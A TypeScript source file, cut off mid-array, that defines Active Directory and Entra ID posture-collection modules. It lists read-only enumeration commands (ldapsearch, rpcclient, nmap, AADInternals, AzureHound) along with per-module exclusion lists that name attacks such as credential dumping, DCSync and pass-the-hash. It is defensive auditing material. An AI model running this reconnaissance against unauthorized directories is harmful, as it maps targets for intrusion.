import { CollectionModule } from './types'

export const fallbackCollectionModules: CollectionModule[] = [
  {
    id: 'enum', name: 'Directory Inventory', category: 'directory',
    description: 'Core identity, host, OU, trust, and controller discovery for a clean environment baseline.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'native-domain-basics', name: 'Native domain basics',
        description: 'Built-in Windows inventory for users, groups, password policy, and DC discovery.',
        commands: [
          { id: 'net-user-domain', title: 'List domain users', command: 'net user /domain', notes: 'Baseline identity inventory.' },
          { id: 'net-user-domain-single', title: 'Inspect one user', command: 'net user <username> /domain', notes: 'Detailed account attributes for a single principal.' },
          { id: 'net-group-domain', title: 'List domain groups', command: 'net group /domain', notes: 'Broad security and distribution group inventory.' },
          { id: 'net-group-domain-admins', title: 'Review Domain Admins', command: 'net group "Domain Admins" /domain', notes: 'Quick privileged membership check.' },
          { id: 'net-accounts-domain', title: 'Review password policy', command: 'net accounts /domain', notes: 'Password and lockout policy visibility.' },
          { id: 'nltest-dclist', title: 'List domain controllers', command: 'nltest /dclist:<domain>', notes: 'Controller inventory for the current domain.' },
        ],
      },
      {
        id: 'powershell-directory-services', name: 'PowerShell directory services',
        description: 'Read-only .NET LDAP helpers when RSAT is unavailable.',
        commands: [
          { id: 'get-current-domain', title: 'Get current domain', command: '[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()', notes: 'Returns the current domain object.' },
          { id: 'get-current-dn', title: 'Get current domain DN', command: "([adsi]'').distinguishedName", notes: 'Reads the current naming context.' },
          { id: 'directory-entry', title: 'Create LDAP entry', command: 'New-Object System.DirectoryServices.DirectoryEntry($LDAP)', notes: 'Bootstrap object for LDAP reads.' },
          { id: 'directory-searcher', title: 'Create searcher', command: 'New-Object System.DirectoryServices.DirectorySearcher($direntry)', notes: 'Reusable read-only search helper.' },
          { id: 'sam-account-type-filter', title: 'Filter user objects', command: '$dirsearcher.filter="samAccountType=805306368"', notes: 'Targets standard user accounts.' },
          { id: 'directory-findall', title: 'Execute search', command: '$dirsearcher.FindAll()', notes: 'Runs the current LDAP query.' },
        ],
      },
      {
        id: 'rsat-directory-queries', name: 'RSAT ActiveDirectory queries',
        description: 'Higher-fidelity inventory when the ActiveDirectory module is available.',
        commands: [
          { id: 'get-aduser-all', title: 'Enumerate users', command: 'Get-ADUser -Filter *', notes: 'All user objects.' },
          { id: 'get-adcomputer-all', title: 'Enumerate computers', command: 'Get-ADComputer -Filter *', notes: 'All computer objects.' },
          { id: 'get-adgroup-all', title: 'Enumerate groups', command: 'Get-ADGroup -Filter *', notes: 'All group objects.' },
          { id: 'get-adgroupmember-domain-admins-enum', title: 'Enumerate Domain Admins members', command: 'Get-ADGroupMember "Domain Admins"', notes: 'Privileged membership review.' },
          { id: 'get-adou-all', title: 'Enumerate OUs', command: 'Get-ADOrganizationalUnit -Filter *', notes: 'Directory structure visibility.' },
          { id: 'get-addomain', title: 'Get domain details', command: 'Get-ADDomain', notes: 'Returns domain configuration basics.' },
          { id: 'get-addomaincontroller', title: 'Get controllers', command: 'Get-ADDomainController', notes: 'Returns DC inventory.' },
          { id: 'get-adtrust', title: 'Enumerate trusts', command: 'Get-ADTrust -Filter *', notes: 'Domain and forest trust visibility.' },
        ],
      },
      {
        id: 'linux-directory-queries', name: 'Linux LDAP and RPC inventory',
        description: 'Read-only remote enumeration from a Linux operator node.',
        commands: [
          { id: 'ldapsearch-base', title: 'Run base LDAP search', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com"', notes: 'Base object extraction from the directory.' },
          { id: 'rpcclient-open', title: 'Open rpcclient session', command: 'rpcclient -U <username> <IP>', notes: 'Interactive RPC context for read-only domain queries.' },
          { id: 'rpcclient-enumdomusers', title: 'Enumerate domain users', command: 'enumdomusers', notes: 'Run inside rpcclient.' },
          { id: 'rpcclient-enumdomgroups', title: 'Enumerate domain groups', command: 'enumdomgroups', notes: 'Run inside rpcclient.' },
          { id: 'rpcclient-queryuser', title: 'Inspect user by RID', command: 'queryuser <RID>', notes: 'Detailed account record by RID.' },
          { id: 'nmap-ldap-search', title: 'LDAP NSE discovery', command: 'nmap -p 389 --script ldap-search <IP>', notes: 'Quick anonymous exposure check when permitted.' },
        ],
      },
    ],
    excluded_capabilities: ['credential dumping', 'remote code execution', 'pass-the-hash', 'ticket forgery', 'persistence abuse'],
  },
  {
    id: 'topology', name: 'Topology and Trusts', category: 'topology',
    description: 'Forest, site, OU, trust, and domain controller topology mapping for environment understanding.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'powershell-topology', name: 'PowerShell topology mapping',
        description: 'Domain and forest structure queries from Windows.',
        commands: [
          { id: 'get-adforest', title: 'Get forest details', command: 'Get-ADForest', notes: 'Forest-wide view of domains and sites.' },
          { id: 'get-adtrust-topology', title: 'Enumerate trust relationships', command: 'Get-ADTrust -Filter *', notes: 'Trust map for adjacent domains and forests.' },
          { id: 'get-adreplicationsite', title: 'Enumerate AD sites', command: 'Get-ADReplicationSite -Filter *', notes: 'Site topology and replication boundaries.' },
          { id: 'get-adorganizationalunit-topology', title: 'Enumerate OU hierarchy', command: 'Get-ADOrganizationalUnit -Filter *', notes: 'High-level business and administrative structure.' },
        ],
      },
      {
        id: 'dns-and-discovery-topology', name: 'DNS and discovery topology',
        description: 'Cross-platform trust and controller discovery using DNS and LDAP.',
        commands: [
          { id: 'dig-kerberos-srv', title: 'Resolve Kerberos SRV records', command: 'dig +short _kerberos._tcp.<domain> SRV', notes: 'Controller and Kerberos service discovery.' },
          { id: 'dig-ldap-srv', title: 'Resolve LDAP SRV records', command: 'dig +short _ldap._tcp.<domain> SRV', notes: 'Domain controller discovery over DNS.' },
          { id: 'ldapsearch-configuration-nc', title: 'Query configuration naming context', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(objectClass=crossRef)"', notes: 'Forest partition and trust-relevant metadata.' },
        ],
      },
    ],
    excluded_capabilities: ['trust abuse', 'lateral movement', 'forest pivoting'],
  },
  {
    id: 'kerberos', name: 'Kerberos Posture', category: 'identity',
    description: 'Ticket state, delegation flags, SPN exposure, and encryption posture without ticket theft or injection.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'kerberos-session-state', name: 'Kerberos session state',
        description: 'Inspect current ticket state and local security context.',
        commands: [
          { id: 'klist', title: 'List current tickets', command: 'klist', notes: 'Current Kerberos cache visibility.' },
          { id: 'whoami-groups-kerberos', title: 'Show group memberships', command: 'whoami /groups', notes: 'Useful for tier and delegation context.' },
          { id: 'whoami-priv-kerberos', title: 'Show privileges', command: 'whoami /priv', notes: 'Checks locally enabled privileges.' },
        ],
      },
      {
        id: 'kerberos-directory-attributes', name: 'Kerberos directory attributes',
        description: 'Account flags commonly used in Kerberos posture reviews.',
        commands: [
          { id: 'get-aduser-kerberos-props', title: 'Review user Kerberos flags', command: 'Get-ADUser -Identity <username> -Properties ServicePrincipalName,DoesNotRequirePreAuth,TrustedForDelegation,TrustedToAuthForDelegation,msDS-SupportedEncryptionTypes', notes: 'Surfaces SPNs, pre-auth, delegation, and encryption settings.' },
          { id: 'get-adcomputer-kerberos-props', title: 'Review computer delegation flags', command: 'Get-ADComputer -Identity <hostname> -Properties TrustedForDelegation,TrustedToAuthForDelegation,msDS-SupportedEncryptionTypes', notes: 'Checks delegation and enctype posture for hosts.' },
        ],
      },
      {
        id: 'linux-kerberos-ldap-queries', name: 'Linux Kerberos LDAP queries',
        description: 'Cross-platform SPN and pre-auth visibility using LDAP only.',
        commands: [
          { id: 'ldapsearch-spn-users', title: 'Find SPN-bearing accounts', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName', notes: 'Service account discovery without requesting tickets.' },
          { id: 'ldapsearch-preauth-disabled', title: 'Find pre-auth disabled users', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName', notes: 'Flags AS-REP exposure without abusing it.' },
          { id: 'ldapsearch-delegation', title: 'Find delegation-enabled accounts', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(|(TrustedForDelegation=TRUE)(TrustedToAuthForDelegation=TRUE))" cn', notes: 'Delegation visibility for privileged principals.' },
        ],
      },
    ],
    excluded_capabilities: ['ticket extraction', 'ticket injection', 'kerberoast abuse', 'as-rep roast abuse', 'golden or silver ticket operations'],
  },
  {
    id: 'acl', name: 'Privilege and Control Paths', category: 'authorization',
    description: 'Membership, local admin, and directory-control visibility for privilege exposure mapping.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'identity-privilege-visibility', name: 'Identity privilege visibility',
        description: 'Fast local and domain privilege checks.',
        commands: [
          { id: 'whoami-groups-acl', title: 'List current groups', command: 'whoami /groups', notes: 'Effective group memberships.' },
          { id: 'whoami-priv-acl', title: 'List current privileges', command: 'whoami /priv', notes: 'Enabled local privileges.' },
          { id: 'get-adgroupmember-domain-admins', title: 'List Domain Admins members', command: 'Get-ADGroupMember "Domain Admins"', notes: 'High-value membership review.' },
          { id: 'net-localgroup-admins', title: 'List local administrators', command: 'net localgroup administrators', notes: 'Host-level admin membership.' },
        ],
      },
      {
        id: 'linux-privileged-membership', name: 'Linux privileged membership checks',
        description: 'LDAP and RPC reads for high-value group visibility.',
        commands: [
          { id: 'ldapsearch-admincount', title: 'Find adminCount principals', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(adminCount=1)" cn sAMAccountName', notes: 'Highlights protected or privileged objects.' },
          { id: 'rpcclient-querygroup', title: 'Inspect group by RID', command: 'querygroup <RID>', notes: 'Run inside rpcclient for detailed group data.' },
          { id: 'nmap-smb-enum-users', title: 'Enumerate SMB users', command: 'nmap -p 139,445 --script smb-enum-users <IP>', notes: 'Alternative identity exposure check over SMB.' },
        ],
      },
      {
        id: 'filesystem-acl-context', name: 'Filesystem ACL context',
        description: 'Local ACL reads for path exposure reviews.',
        commands: [
          { id: 'icacls-path', title: 'Inspect filesystem ACLs', command: 'icacls <filepath>', notes: 'Displays file and folder access control entries.' },
        ],
      },
    ],
    excluded_capabilities: ['privilege escalation abuse', 'service binary replacement', 'writable service path exploitation'],
  },
  {
    id: 'gpo', name: 'Group Policy Coverage', category: 'policy',
    description: 'GPO inventory, links, and inheritance visibility for policy hygiene and blast-radius analysis.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-gpo-inventory', name: 'Windows GPO inventory',
        description: 'Read-only GPO and inheritance inspection from Windows.',
        commands: [
          { id: 'get-gpo-all', title: 'Enumerate GPOs', command: 'Get-GPO -All', notes: 'Global GPO inventory.' },
          { id: 'get-gpinheritance', title: 'Review GPO inheritance', command: 'Get-GPInheritance -Target "OU=Servers,DC=corp,DC=com"', notes: 'Policy link and precedence review.' },
          { id: 'get-adorganizationalunit-gpo', title: 'Enumerate OUs for GPO scope', command: 'Get-ADOrganizationalUnit -Filter *', notes: 'Scope discovery for applied policies.' },
        ],
      },
      {
        id: 'ldap-gpo-queries', name: 'LDAP GPO queries',
        description: 'Cross-platform GPO metadata discovery via LDAP.',
        commands: [
          { id: 'ldapsearch-gpc', title: 'Find GPO containers', command: 'ldapsearch -x -H ldap://<IP> -b "cn=policies,cn=system,dc=corp,dc=com" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath versionNumber', notes: 'Enumerates policy containers and SYSVOL paths.' },
          { id: 'ldapsearch-ou-links', title: 'Review OU GPO links', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(gPLink=*)" distinguishedName gPLink', notes: 'OU link visibility without changing scope.' },
        ],
      },
    ],
    excluded_capabilities: ['policy tampering', 'startup script abuse', 'malicious GPO deployment'],
  },
  {
    id: 'adcs', name: 'Certificate Services Posture', category: 'certificate-services',
    description: 'Enterprise CA, enrollment service, and certificate template visibility for AD CS hygiene.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-adcs-review', name: 'Windows AD CS review',
        description: 'Read-only certificate service checks from a Windows operator node.',
        commands: [
          { id: 'certutil-config-ping', title: 'Ping CA configuration', command: 'certutil -config - -ping', notes: 'Quick CA reachability and enrollment service visibility.' },
          { id: 'certutil-template', title: 'List certificate templates', command: 'certutil -template', notes: 'Template inventory from Windows tooling.' },
        ],
      },
      {
        id: 'ldap-adcs-discovery', name: 'LDAP AD CS discovery',
        description: 'Cross-platform AD CS object discovery using LDAP only.',
        commands: [
          { id: 'ldapsearch-enrollment-services', title: 'Enumerate enrollment services', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(objectClass=pKIEnrollmentService)" dNSHostName cn certificateTemplates', notes: 'CA server and published template visibility.' },
          { id: 'ldapsearch-cert-templates', title: 'Enumerate certificate templates', command: 'ldapsearch -x -H ldap://<IP> -b "cn=configuration,dc=corp,dc=com" "(objectClass=pKICertificateTemplate)" cn displayName msPKI-Enrollment-Flag msPKI-Certificate-Name-Flag', notes: 'Template flags and naming posture.' },
        ],
      },
    ],
    excluded_capabilities: ['certificate abuse', 'esc exploitation', 'certificate-based lateral movement'],
  },
  {
    id: 'smb', name: 'SMB and Share Visibility', category: 'host-access',
    description: 'Share, permission, host fingerprinting, and anonymous exposure checks without remote execution.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-share-review', name: 'Windows share review',
        description: 'Host-level share and admin context visibility from Windows.',
        commands: [
          { id: 'net-localgroup-admins-smb', title: 'List local administrators', command: 'net localgroup administrators', notes: 'Quick host admin baseline.' },
          { id: 'net-view-host', title: 'List host shares', command: 'net view \\\\<computername>', notes: 'Basic share discovery from Windows.' },
        ],
      },
      {
        id: 'linux-smb-discovery', name: 'Linux SMB discovery',
        description: 'Read-only SMB share and permission visibility using Linux tools.',
        commands: [
          { id: 'smbclient-list-shares', title: 'List SMB shares', command: 'smbclient -L \\\\<IP> -U <username>', notes: 'Share inventory with authorized credentials.' },
          { id: 'smbclient-open-share', title: 'Inspect one share', command: 'smbclient \\\\<IP>\\<share> -U <username>', notes: 'Interactive read-only browse when access is already granted.' },
          { id: 'smbmap-list-shares', title: 'Map share permissions', command: 'smbmap -H <IP> -u <username> -p <password>', notes: 'Permission visibility for discovered shares.' },
          { id: 'nmap-smb-os', title: 'Fingerprint SMB host OS', command: 'nmap -p 139,445 --script smb-os-discovery <IP>', notes: 'Basic SMB host fingerprinting.' },
          { id: 'nmap-smb-shares', title: 'Enumerate SMB shares with Nmap', command: 'nmap -p 139,445 --script smb-enum-shares <IP>', notes: 'Alternative share discovery path.' },
          { id: 'nmap-smb-users', title: 'Enumerate SMB users with Nmap', command: 'nmap -p 139,445 --script smb-enum-users <IP>', notes: 'Identity exposure over SMB.' },
        ],
      },
    ],
    excluded_capabilities: ['remote command execution', 'pass-the-hash', 'lateral movement', 'share abuse'],
  },
  {
    id: 'passwords', name: 'Password Hygiene', category: 'identity-hygiene',
    description: 'Password policy, stale-account, and non-expiring-password visibility without credential extraction workflows.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-password-policy', name: 'Windows password policy',
        description: 'Domain password and account hygiene checks from Windows.',
        commands: [
          { id: 'net-accounts-domain-passwords', title: 'Review domain password policy', command: 'net accounts /domain', notes: 'Baseline policy visibility.' },
          { id: 'get-aduser-password-hygiene', title: 'Review password hygiene fields', command: 'Get-ADUser -Filter * -Properties PasswordLastSet,LastLogonDate,PasswordNeverExpires,Enabled', notes: 'Useful for stale and non-expiring account review.' },
          { id: 'get-aduser-single-password-hygiene', title: 'Inspect one account', command: 'Get-ADUser -Identity <username> -Properties *', notes: 'Deep inspection for a single principal.' },
        ],
      },
      {
        id: 'linux-password-hygiene', name: 'Linux password hygiene queries',
        description: 'Cross-platform password posture discovery via LDAP.',
        commands: [
          { id: 'ldapsearch-password-never-expires', title: 'Find non-expiring passwords', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" sAMAccountName', notes: 'Flags accounts with PasswordNeverExpires.' },
          { id: 'ldapsearch-stale-users', title: 'Find enabled accounts', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user))" sAMAccountName pwdLastSet lastLogonTimestamp userAccountControl', notes: 'Supports stale-account triage offline in the UI.' },
        ],
      },
    ],
    excluded_capabilities: ['credential extraction', 'offline cracking workflows', 'gpp secret abuse'],
  },
  {
    id: 'dns', name: 'DNS and Service Discovery', category: 'infrastructure',
    description: 'Service discovery, controller resolution, and SRV record validation for clean domain connectivity mapping.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-dns-discovery', name: 'Windows DNS discovery',
        description: 'Native DNS checks from Windows endpoints.',
        commands: [
          { id: 'nslookup-domain', title: 'Resolve the domain', command: 'nslookup <domain>', notes: 'Basic domain resolution validation.' },
          { id: 'nslookup-ldap-srv', title: 'Resolve LDAP SRV', command: 'nslookup -type=SRV _ldap._tcp.<domain>', notes: 'Controller service discovery.' },
          { id: 'nslookup-kerberos-srv', title: 'Resolve Kerberos SRV', command: 'nslookup -type=SRV _kerberos._tcp.<domain>', notes: 'Kerberos service discovery.' },
        ],
      },
      {
        id: 'linux-dns-discovery', name: 'Linux DNS discovery',
        description: 'Cross-platform SRV and host resolution checks.',
        commands: [
          { id: 'dig-domain', title: 'Resolve the domain', command: 'dig +short <domain>', notes: 'Fast DNS resolution check.' },
          { id: 'dig-ldap-srv-dns', title: 'Resolve LDAP SRV', command: 'dig +short _ldap._tcp.<domain> SRV', notes: 'Controller service discovery.' },
          { id: 'dig-kerberos-srv-dns', title: 'Resolve Kerberos SRV', command: 'dig +short _kerberos._tcp.<domain> SRV', notes: 'Kerberos service discovery.' },
        ],
      },
    ],
    excluded_capabilities: ['dns poisoning', 'service redirection'],
  },
  {
    id: 'sessions', name: 'Session and Logon Context', category: 'host-activity',
    description: 'Interactive-user and current-session visibility for operator awareness and review of logged-on context.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-session-visibility', name: 'Windows session visibility',
        description: 'Native commands for logon and user context checks.',
        commands: [
          { id: 'query-user', title: 'List logged-on users', command: 'query user', notes: 'Interactive and disconnected session visibility.' },
          { id: 'query-session', title: 'List sessions', command: 'query session', notes: 'Session inventory for the local host or terminal server.' },
          { id: 'whoami-all', title: 'Review current security context', command: 'whoami /all', notes: 'Aggregated groups, privileges, and claims.' },
        ],
      },
    ],
    excluded_capabilities: ['session hijacking', 'credential theft'],
  },
  {
    id: 'persistence', name: 'Persistence Indicators', category: 'host-persistence',
    description: 'Scheduled-task, startup, and service-baseline visibility without hijack or deployment paths.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'scheduled-task-visibility', name: 'Scheduled task visibility',
        description: 'Read-only scheduled task and service baseline review.',
        commands: [
          { id: 'schtasks-query', title: 'List scheduled tasks', command: 'schtasks /query /fo LIST', notes: 'Recurring execution visibility.' },
          { id: 'get-service', title: 'List Windows services', command: 'Get-Service', notes: 'Baseline service inventory for follow-on review.' },
          { id: 'wmic-startup', title: 'List startup commands', command: 'wmic startup get Caption,Command,Location,User', notes: 'Startup persistence visibility from built-in tooling.' },
        ],
      },
    ],
    excluded_capabilities: ['shadow credential abuse', 'ticket persistence', 'service hijacking', 'backdoor deployment'],
  },
  {
    id: 'hybrid', name: 'Hybrid Import', category: 'hybrid',
    description: 'Azure AD Connect, PHS/PTA/ADFS sync posture, AADInternals/ROADtools enumeration, AzureHound collection, Entra ID tenant checks, and import of externally collected posture evidence.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'hybrid-azure-ad-connect', name: 'Azure AD Connect posture',
        description: 'Enumerate Azure AD Connect server, sync mode, and privileged sync account.',
        commands: [
          { id: 'hybrid-aadc-discover', title: 'Discover AAD Connect server (AD)', command: "Get-ADObject -LDAPFilter '(description=*AAD*)' -Properties description | Select-Object Name,description", notes: 'Locates the Azure AD Connect server object in AD.' },
          { id: 'hybrid-aadc-msol-account', title: 'Find MSOL sync account', command: "Get-ADUser -Filter {SamAccountName -like 'MSOL_*'} -Properties SamAccountName,Description,PasswordNeverExpires,Enabled", notes: 'MSOL_ account holds DCSync-equivalent privileges for PHS sync.' },
          { id: 'hybrid-aadc-service', title: 'Check AAD Connect service (local)', command: "Get-Service -DisplayName 'Microsoft Azure AD Sync' | Select-Object Status,DisplayName,StartType", notes: 'Run on the AAD Connect server to check sync service state.' },
          { id: 'hybrid-aadc-sync-mode', title: 'Read AAD Connect config (local)', command: 'Import-Module ADSync; Get-ADSyncGlobalSettings | Select-Object SyncAccountName,SyncCycle*,AadDistinguishedName', notes: 'Reveals PHS/PTA/ADFS sync mode and service account.' },
          { id: 'hybrid-aadc-scheduler', title: 'Read sync scheduler', command: 'Import-Module ADSync; Get-ADSyncScheduler | Select-Object SyncCycleEnabled,NextSyncCyclePolicyType,NextSyncCycleStartTimeInUTC', notes: 'Sync schedule and current cycle state.' },
        ],
      },
      {
        id: 'hybrid-aadint-enum', name: 'AADInternals and ROADtools',
        description: 'Authorized Entra ID posture review using AADInternals and ROADtools.',
        commands: [
          { id: 'hybrid-aadint-tenantinfo', title: 'Get tenant info (AADInternals)', command: 'Import-Module AADInternals; Get-AADIntLoginInformation -Domain <Domain>', notes: 'Returns tenant ID, federation type, and brand name without credentials.' },
          { id: 'hybrid-aadint-users', title: 'Enumerate Entra users (AADInternals)', command: 'Import-Module AADInternals; Get-AADIntUsers -AccessToken $token | Select-Object UserPrincipalName,AccountEnabled,Roles', notes: 'Requires valid access token from Get-AADIntAccessTokenForMSGraph.' },
          { id: 'hybrid-aadint-roles', title: 'List privileged role members', command: "Import-Module AADInternals; Get-AADIntRoleMembers -RoleName 'Global Administrator'", notes: 'Reviews Global Admin, Privileged Role Admin, and Application Admin members.' },
          { id: 'hybrid-roadtools-gather', title: 'Collect Entra objects (ROADtools)', command: 'roadrecon gather --tokens <TokenFile> --all', notes: 'Collects users, groups, apps, service principals, and role assignments.' },
          { id: 'hybrid-roadtools-auth', title: 'Authenticate ROADtools (device code)', command: 'roadrecon auth --device-code', notes: 'Device-code flow for authorized token acquisition.' },
          { id: 'hybrid-roadtools-gui', title: 'Launch ROADtools GUI', command: 'roadrecon-gui', notes: 'Web interface for exploring collected Entra data.' },
        ],
      },
      {
        id: 'hybrid-azurehound', name: 'AzureHound graph collection',
        description: 'Azure-side graph collection for BloodHound analysis.',
        commands: [
          { id: 'hybrid-azurehound-collect', title: 'Run AzureHound collection', command: 'azurehound -u <UPN> -p \'<Password>\' list --tenant <TenantID> -o azurehound.zip', notes: 'Collects Entra users, groups, roles, service principals, and subscriptions for graph analysis.' },
          { id: 'hybrid-azurehound-token', title: 'Run AzureHound with token', command: 'azurehound -t <AccessToken> list --tenant <TenantID> -o azurehound.zip', notes: 'Token-based collection — avoids plaintext credential logging.' },
        ],
      },
      {
        id: 'hybrid-phs-pta', name: 'PHS and PTA exposure checks',
        description: 'Password Hash Sync and Pass-Through Authentication posture.',
        commands: [
          { id: 'hybrid-pta-agent', title: 'Find PTA authentication agents (AD)', command: "Get-ADObject -SearchBase 'CN=Pass Through Authentication,CN=Microsoft Azure AD,CN=System,DC=corp,DC=com' -Filter * -Properties *", notes: 'PTA agents registered in on-prem AD under the Microsoft Azure AD container.' },
          { id: 'hybrid-adfs-endpoint', title: 'Find ADFS service account', command: "Get-ADUser -Filter {ServicePrincipalName -like 'http/adfs*'} -Properties ServicePrincipalName,Description", notes: 'ADFS service account SPN for federation endpoint discovery.' },
          { id: 'hybrid-seamless-sso', title: 'Find Seamless SSO computer account', command: "Get-ADComputer -Filter {Name -eq 'AZUREADSSOACC'} -Properties Description,PasswordLastSet", notes: 'AZUREADSSOACC uses a static Kerberos key — rotation hygiene check.' },
        ],
      },
    ],
    excluded_capabilities: ['token theft', 'cloud tenant abuse', 'credential extraction from sync DB'],
  },
]

const expandedCollectionModules: CollectionModule[] = [
  {
    id: 'dc_health', name: 'Domain Controller Health', category: 'infrastructure',
    description: 'Controller readiness, LDAP/Kerberos/DNS reachability, SYSVOL state, and basic DC diagnostics.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-dc-diagnostics', name: 'Windows DC diagnostics',
        description: 'Native DC health and service checks.',
        commands: [
          { id: 'dcdiag-summary', title: 'Run DC health summary', command: 'dcdiag /q', notes: 'Quiet health summary for domain controllers.' },
          { id: 'dcdiag-dns', title: 'Run DNS DC diagnostics', command: 'dcdiag /test:dns /v', notes: 'Detailed DNS health for domain services.' },
          { id: 'nltest-dsgetdc', title: 'Locate a domain controller', command: 'nltest /dsgetdc:<domain>', notes: 'Validates DC locator behavior.' },
          { id: 'nltest-sc-query', title: 'Check secure channel', command: 'nltest /sc_query:<domain>', notes: 'Validates machine secure channel state.' },
          { id: 'netdom-query-fsmo', title: 'List FSMO role holders', command: 'netdom query fsmo', notes: 'FSMO placement visibility.' },
          { id: 'dfsrm-sysvol-state', title: 'Check SYSVOL replication state', command: 'dfsrdiag ReplicationState', notes: 'SYSVOL replication activity visibility.' },
        ],
      },
      {
        id: 'linux-dc-reachability', name: 'Linux DC reachability',
        description: 'Network-level service checks from a remote Linux collector host.',
        commands: [
          { id: 'nmap-dc-core-ports', title: 'Scan AD core ports', command: 'nmap -Pn -p 53,88,135,389,445,464,636,3268,3269 <IP>', notes: 'Confirms core AD services are reachable.' },
          { id: 'ldapsearch-rootdse', title: 'Read RootDSE', command: 'ldapsearch -x -H ldap://<IP> -s base -b "" defaultNamingContext configurationNamingContext schemaNamingContext dnsHostName', notes: 'LDAP RootDSE discovery.' },
          { id: 'dig-dc-a-record', title: 'Resolve DC hostname', command: 'dig @<IP> +short <hostname>', notes: 'Validates DNS resolution from the DC.' },
          { id: 'dig-domain-soa', title: 'Resolve domain SOA', command: 'dig @<IP> +short <domain> SOA', notes: 'Checks authoritative domain DNS response.' },
        ],
      },
    ],
    excluded_capabilities: ['service disruption', 'dc exploitation'],
  },
  {
    id: 'replication', name: 'Replication and Sites', category: 'topology',
    description: 'Replication health, site topology, naming contexts, and stale replication visibility.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-replication', name: 'Windows replication checks',
        description: 'Native replication summary and partner state.',
        commands: [
          { id: 'repadmin-replsummary', title: 'Replication summary', command: 'repadmin /replsummary', notes: 'Forest/domain replication failure summary.' },
          { id: 'repadmin-showrepl', title: 'Show replication partners', command: 'repadmin /showrepl * /csv', notes: 'Partner and naming-context replication detail.' },
          { id: 'repadmin-queue', title: 'Show replication queue', command: 'repadmin /queue', notes: 'Pending replication work visibility.' },
          { id: 'get-adreplicationfailure', title: 'List replication failures', command: 'Get-ADReplicationFailure -Scope Forest', notes: 'PowerShell replication failure inventory.' },
          { id: 'get-adreplicationpartner', title: 'List replication partners', command: 'Get-ADReplicationPartnerMetadata -Target * -Scope Forest', notes: 'Partner metadata for trend review.' },
        ],
      },
      {
        id: 'ldap-sites-config', name: 'LDAP site topology',
        description: 'Read sites and subnet configuration over LDAP.',
        commands: [
          { id: 'ldapsearch-sites', title: 'Enumerate AD sites', command: 'ldapsearch -x -H ldap://<IP> -b "cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=site)" cn', notes: 'Site object inventory.' },
          { id: 'ldapsearch-subnets', title: 'Enumerate AD subnets', command: 'ldapsearch -x -H ldap://<IP> -b "cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=subnet)" cn siteObject', notes: 'Subnet to site mapping.' },
          { id: 'ldapsearch-ntds-settings', title: 'Enumerate NTDS settings', command: 'ldapsearch -x -H ldap://<IP> -b "cn=sites,cn=configuration,dc=corp,dc=com" "(objectClass=nTDSDSA)" cn options', notes: 'Replication settings visibility.' },
        ],
      },
    ],
    excluded_capabilities: ['replication abuse', 'dcsync'],
  },
  {
    id: 'account_lifecycle', name: 'Account Lifecycle Hygiene', category: 'identity-hygiene',
    description: 'Dormant, disabled, locked, expiring, and recently changed account visibility.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-account-lifecycle', name: 'Windows account lifecycle',
        description: 'PowerShell lifecycle queries for user and computer objects.',
        commands: [
